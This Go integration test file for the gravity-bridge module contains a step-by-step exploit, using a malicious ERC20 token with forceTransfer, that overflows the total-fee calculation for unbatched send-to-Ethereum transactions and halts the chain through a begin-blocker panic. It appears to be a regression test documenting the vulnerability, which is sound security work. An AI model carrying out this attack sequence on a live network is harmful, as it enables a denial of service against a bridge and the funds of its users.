package integration_tests

import (
	"context"
	"time"

	sdkmath "cosmossdk.io/math"
	sdk "github.com/cosmos/cosmos-sdk/types"
	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"
	"github.com/ethereum/go-ethereum/common"
	"github.com/peggyjv/gravity-bridge/module/v6/x/gravity/types"
)

const mintABIJSON = `[
	{
      "inputs": [
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "mint",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
]`

func packMint(to common.Address, amount sdkmath.Int) []byte {
	return packCall(mintABIJSON, "mint", []interface{}{to, amount.BigInt()})
}

const forceTransferABIJSON = `[
	{
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "forceTransfer",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
	}
]`

func packForceTransfer(from common.Address, to common.Address, amount sdkmath.Int) []byte {
	return packCall(forceTransferABIJSON, "forceTransfer", []interface{}{from, to, amount.BigInt()})
}

func (s *IntegrationTestSuite) mintMaliciousErc20(to common.Address, amount sdkmath.Int) error {
	return s.SendEthTransaction(&s.chain.validators[0].ethereumKey, maliciousERC20contract, packMint(to, amount))
}

func (s *IntegrationTestSuite) getCosmosDenomBalance(account sdk.AccAddress, denom string) (sdkmath.Int, error) {
	val := s.chain.validators[0]
	kb, err := val.keyring()
	if err != nil {
		return sdkmath.ZeroInt(), err
	}
	clientCtx, err := s.chain.clientContext("tcp://localhost:26657", &kb, "val", val.address())
	if err != nil {
		return sdkmath.ZeroInt(), err
	}

	bankQueryClient := banktypes.NewQueryClient(clientCtx)
	res, err := bankQueryClient.Balance(context.Background(),
		&banktypes.QueryBalanceRequest{
			Address: account.String(),
			Denom:   denom,
		})
	if err != nil {
		return sdkmath.ZeroInt(), err
	}

	return res.Balance.Amount, nil
}

func (s *IntegrationTestSuite) sendMaliciousErc20ToCosmos(cosmosReceiver sdk.AccAddress, amount sdkmath.Int) {
	err := s.SendEthTransaction(&s.chain.validators[0].ethereumKey, gravityContract, PackSendToCosmos(maliciousERC20contract, cosmosReceiver, amount))
	s.Require().NoError(err)

	denom := "gravity" + maliciousERC20contract.String()
	s.Require().Eventuallyf(func() bool {
		balance, err := s.getCosmosDenomBalance(cosmosReceiver, denom)
		if err != nil {
			return false
		}

		if balance.LT(amount) {
			return false
		}

		return true
	}, 105*time.Second, 1*time.Second, "balance never found on cosmos")
}

func (s *IntegrationTestSuite) approve() error {
	return s.SendEthTransaction(&s.chain.validators[0].ethereumKey, maliciousERC20contract, PackApproveERC20(gravityContract))
}

func (s *IntegrationTestSuite) clearGravityMaliciousErc20Balance() {
	erc20Balance, err := s.getEthTokenBalanceOf(gravityContract, maliciousERC20contract)
	s.Require().NoError(err)

	if erc20Balance.IsZero() {
		s.T().Log("No balance found for gravity contract. No need to clear.")
		return
	}

	s.T().Logf("Clearing gravity contract balance gravityContract=%s amount=%s", gravityContract, erc20Balance)
	to := common.HexToAddress(s.chain.validators[0].ethereumKey.address)
	err = s.SendEthTransaction(&s.chain.validators[0].ethereumKey, maliciousERC20contract, packForceTransfer(gravityContract, to, *erc20Balance))
	s.Require().NoError(err)

	erc20Balance, err = s.getEthTokenBalanceOf(gravityContract, maliciousERC20contract)
	s.Require().NoError(err)
	s.Require().True(erc20Balance.IsZero())
}

func (s *IntegrationTestSuite) sendMsgs(mgs []sdk.Msg) {
	s.Require().Eventuallyf(func() bool {
		val := s.chain.validators[0]
		keyring, err := val.keyring()
		s.Require().NoError(err)
		clientCtx, err := s.chain.clientContext("tcp://localhost:26657", &keyring, "val", val.address())
		s.Require().NoError(err)

		response, err := s.chain.sendMsgs(*clientCtx, mgs...)
		if err != nil {
			s.T().Logf("error: %s", err)
			return false
		}
		if response.Code != 0 {
			if response.Code != 32 {
				s.T().Log(response)
			}

			return false
		}
		return true
	}, 10*time.Second, 1*time.Second, "unable to submit messages")

}

func (s *IntegrationTestSuite) sendToEthereumAndConfirm(amount sdkmath.Int, fee sdkmath.Int) {
	denom := "gravity" + maliciousERC20contract.String()
	sendToEthereumMsg := types.NewMsgSendToEthereum(
		s.chain.validators[0].address(),
		s.chain.validators[0].ethereumKey.address,
		sdk.Coin{Denom: denom, Amount: amount},
		sdk.Coin{Denom: denom, Amount: fee},
	)
	s.sendMsgs([]sdk.Msg{sendToEthereumMsg})
}

func (s *IntegrationTestSuite) getBatches() []*types.SendToEthereum {
	val := s.chain.validators[0]
	keyring, err := val.keyring()
	s.Require().NoError(err)
	clientCtx, err := s.chain.clientContext("tcp://localhost:26657", &keyring, "val", val.address())
	s.Require().NoError(err)

	queryClient := types.NewQueryClient(clientCtx)
	res, err := queryClient.BatchedSendToEthereums(context.Background(), &types.BatchedSendToEthereumsRequest{
		SenderAddress: val.address().String(),
	})
	s.Require().NoError(err)
	return res.SendToEthereums
}

func (s *IntegrationTestSuite) getUnbatchedSendToEthereums() []*types.SendToEthereum {
	val := s.chain.validators[0]
	keyring, err := val.keyring()
	s.Require().NoError(err)
	clientCtx, err := s.chain.clientContext("tcp://localhost:26657", &keyring, "val", val.address())
	s.Require().NoError(err)

	queryClient := types.NewQueryClient(clientCtx)
	res, err := queryClient.UnbatchedSendToEthereums(context.Background(), &types.UnbatchedSendToEthereumsRequest{
		SenderAddress: val.address().String(),
	})
	s.Require().NoError(err)
	return res.SendToEthereums
}

func (s *IntegrationTestSuite) logBatchesAndUnbatchedTxs() {
	batches := s.getBatches()
	s.T().Logf("Batches: %s", batches)

	unbatched := s.getUnbatchedSendToEthereums()
	s.T().Logf("Unbatched: %s", unbatched)
}

// This test demonstrates how to exploit a vulnerability in total fee
// calculation for unbatched txs to cause an integer overflow panic in the gravity module
// begin-blocker
func (s *IntegrationTestSuite) TestUnbatchedTxsTotalFeeOverflow() {
	s.T().Log("Starting test for fee overflow")

	maxSupply, ok := sdkmath.NewIntFromString("115792089237316195423570985008687907853269984665640564039457584007913129639935")
	s.Require().True(ok)

	s.T().Log("Approving gravity contract to spend malicious erc20")
	err := s.approve()
	s.Require().NoError(err)

	sender := common.HexToAddress(s.chain.validators[0].ethereumKey.address)
	cosmosReceiver := s.chain.validators[0].address()

	s.T().Logf("Minting malicious erc20 sender=%s amount=%s", sender, maxSupply)
	// Mint maxSupply and transfer to Cosmos
	err = s.mintMaliciousErc20(sender, maxSupply)
	s.Require().NoError(err)

	s.T().Logf("Sending from Ethereum -> Cosmos cosmosReceiver=%s amount=%s", cosmosReceiver, maxSupply)
	s.sendMaliciousErc20ToCosmos(cosmosReceiver, maxSupply)
	// This clears the erc20 balance of the gravity bridge contract
	// to make sure we can transfer the full supply multiple times w/ out
	// overflowing the gravity bridge balance
	s.T().Logf("Checking if gravity contract balance needs to be cleared")
	s.clearGravityMaliciousErc20Balance()

	// Call SendToEthereum to create a new batch with fees of zero
	// Our custom ERC20 will reject transfers of zero, which will block
	// this batch from actually being executed. This gives us enough
	// time to execute the remainder of our attack
	s.T().Logf("Sending from Cosmos -> Ethereum amount=%s fee=%s", sdkmath.OneInt(), sdkmath.ZeroInt())
	s.sendToEthereumAndConfirm(sdkmath.OneInt(), sdkmath.ZeroInt())

	// Wait for first batch to be created (takes ~10 blocks)
	s.T().Log("Waiting for next SendToEthereum tx batch to be created")
	var batches []*types.SendToEthereum
	s.Require().Eventuallyf(func() bool {
		batches = s.getBatches()
		return len(batches) > 0
	}, 105*time.Second, 1*time.Second, "batch never created on cosmos")

	s.logBatchesAndUnbatchedTxs()

	// Call SendToEthereum again with fees of zero
	// A new transfer won't be created since total unbatched fees are not greater than fee for existing batch
	amount := maxSupply.Sub(sdkmath.OneInt())
	s.T().Logf("Sending from Cosmos -> Ethereum amount=%s fee=%s", amount, sdkmath.ZeroInt())
	s.sendToEthereumAndConfirm(amount, sdkmath.ZeroInt())

	// At this point the maxSupply we initially transferred to cosmos is fully burnt
	// So we can send maxSupply from Ethereum -> Cosmos AGAIN without overflowing the total supply
	// Remember we force transfered funds from gravity contract to to ourselves,
	// so we don't need to mint more tokens before triggering send
	s.T().Logf("Sending from Ethereum -> Cosmos recipient=%s fee=%s", cosmosReceiver, maxSupply)
	s.sendMaliciousErc20ToCosmos(cosmosReceiver, maxSupply)

	s.logBatchesAndUnbatchedTxs()

	// // Clear gravity bridge balance to reclaim bridged tokens
	// s.T().Logf("Checking if gravity contract balance needs to be cleared")
	// s.clearGravityMaliciousErc20Balance()

	// Call SendToEthereum with zero fees and maxSupply as amount
	// Again, no batch will be created since total fees are not higher
	// than initial batch
	s.sendToEthereumAndConfirm(maxSupply, sdkmath.ZeroInt())

	s.logBatchesAndUnbatchedTxs()

	denom := "gravity" + maliciousERC20contract.String()
	// Now we'll execute the following messages together in single tx
	// For each unbatched transaction, we cancel to reclaim our tokens
	// and increase the fee.
	// We cancel and send one at a time to prevent total supply from overflowing
	// After 10 blocks, the begin-blocker will for check for new batch
	// by comparing the total fees for outstanding unbatched txs with fees for
	// current batch
	// Computing the total fees for our unbatched sends will overflow because
	// maxSupply * 2 > 2^256 - 1 (max value for sdkmath.Int)
	// The chain will halt
	s.T().Log("Cancelling all unbatched txs and updating fees")
	msgs := []sdk.Msg{
		types.NewMsgCancelSendToEthereum(uint64(2), cosmosReceiver),
		types.NewMsgSendToEthereum(
			s.chain.validators[0].address(),
			s.chain.validators[0].ethereumKey.address,
			sdk.Coin{Denom: denom, Amount: sdkmath.OneInt()},
			sdk.Coin{Denom: denom, Amount: maxSupply.Sub(sdkmath.NewInt(2))},
		),
		types.NewMsgCancelSendToEthereum(uint64(3), cosmosReceiver),
		types.NewMsgSendToEthereum(
			s.chain.validators[0].address(),
			s.chain.validators[0].ethereumKey.address,
			sdk.Coin{Denom: denom, Amount: sdkmath.OneInt()},
			sdk.Coin{Denom: denom, Amount: maxSupply.Sub(sdkmath.OneInt())},
		),
	}
	s.sendMsgs(msgs)
	s.T().Log("Completed TestUnbatchedTxsTotalFeeOverflow test. Check gravity node logs.")
}
